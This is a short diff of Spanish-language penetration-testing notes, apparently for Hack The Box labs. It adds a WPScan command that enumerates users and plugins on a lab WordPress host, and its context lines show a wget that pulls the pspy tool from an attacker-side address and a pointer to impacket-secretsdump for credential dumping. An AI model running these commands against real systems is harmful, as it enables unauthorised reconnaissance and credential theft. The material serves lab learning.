@@ -614,7 +614,14 @@ wget http://10.10.14.80:8000/pspy
 
 Tienen todas las herramientas para trabajar con AD entonces busca las tools primero con impacket ejemplo: impacket-secretsdump...
 
+## WPSCAN
 
+Aqui tienes los comandos basicos para enumerar un WP
+
+```
+wpscan -v --disable-tls-checks --enumerate u,p --url  https://brainfuck.htb/
+
+```
 
 
 
